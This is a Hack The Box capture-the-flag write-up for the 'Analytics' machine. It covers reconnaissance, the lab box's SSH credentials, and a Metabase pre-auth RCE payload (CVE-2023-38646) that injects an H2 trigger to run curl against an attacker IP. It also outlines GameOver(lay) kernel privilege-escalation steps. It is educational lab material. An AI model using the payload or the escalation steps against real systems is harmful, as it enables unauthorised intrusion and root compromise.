---
title: Analytics Report
date: 2023-10-20 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Easy, Python Scripting, CVE-2023-38646, CVE-2023-2640, CVE-2023-32629,  GameOver(lay)]

img_path: /assets/img/htb/writeups/analytics
---

## **Information gathering**

* * *
* * *

**Scope:** 10.10.11.233/32 (Linux)

**TCP Nmap scan:** 65,535 ports

* **Open ports**:
	* 22/ssh:
		* Banner grabbing
			- Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
				* [OpenSSH 9.5](https://www.openssh.com/txt/release-9.5)/[9.5p1](https://www.openssh.com/txt/release-9.5) (2023-10-04)
			- Codename: jammy [codename.py](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/testing_tools/codename.py)
			- CVEs Version: [NIST](https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:8.9p1)
			- Valid creds: 
				- metalytics:An4lytics_ds20223#
	* 80/http:
		* Banner grabbing
			* Server: nginx/1.18.0 (Ubuntu)
		* Follow redirect: http://analytical.htb/
			* Services:
				* Storage
				* Analytics
				* Security
			* Technologies
				* Bootstrap
				* Frame
				* JQuery[3.0.0]
				* Javascript libraries (Design)
			* Headers
				* None
			* Cookies
				* None
			* Emails
				* demo@analytical.com
				* due@analytical.com
			* Users
				* Jonnhy Smith (Chief Data Officer)
				* Alex Kirigo (Data Engineer)
				* Daniel Walker (Data Analyst)
		* Directory Fuzzing
			* file: content/dir_fuzzing
		* Subdomains
			* http://data.analytical.htb
			* Services:
				* Login Page (Metabase)
					* No default creds
			* Technologies
				* Javascript frameworks
					* React, Emotion
				* Lodash 4.17.21
				* Postgres
			* Headers
				* HttpOnly[metabase.DEVICE]
				* UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy]
				* X-Frame-Options[DENY]
				* X-XSS-Protection[1; mode=block]
			* Cookies
				* metabase.DEVICE=05c90a08-5e21-4014-9d9c-40436eee1202;HttpOnly;Path=/;Expires=Mon, 19 Oct 2043 21:00:43 GMT;SameSite=Lax
			* Emails
				* None
			* Users
				* None

* **Filtered ports**:	
	* None

## **Vulnerability Assesment**

* * *
* * *

* [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646) (Unauthenticated metabase RCE)
	* JDBC: Java API, which defines how a client may access a database
	* zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS \$\$//javascript\njava.lang.Runtime.getRuntime().exec('curl 10.10.15.12')\n\$\$--=x
		![](metabase_rce_poc.png)
		* References
			* https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
			* https://github.com/metabase/metabase
			* https://www.metabase.com/learn/administration/metabase-api

## **Exploitation**

* * *
* * *

* [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)
	![](metabase_poc.png)
* metabase enumeration
	* Enviroment variables
		* Credentials: metalytics:An4lytics_ds20223#
			![](creds_leak.png)

## **Post-exploitation**

* * *
* * *

* Metalytics enumeration
	* Kernel version Ubuntu, [CVE-2023-2640 and CVE-2023-32629, aka GameOver(lay)](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)
		* Afected version: Ubuntu 22.04 LTS (Jammy Jellyfish)
			1. unshare -rm sh -c "command": Execute command on privilege namespace to add SUID capabilities
			2. command:
				1. Create overlayfs with python binary (and some dependencies) in lowerdir
				2. Add cap_setuid+eip to python binary
				3. Run python command to set system uid to root and execute commands
				![](root.png)

## **Lateral movement**

* * *
* * *

## **Proof of concept**

* * *
* * *

* CVE-2023-38646 (python script poc): [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/CVE-2023-38646_Analytics)
	![](rce_poc.png)

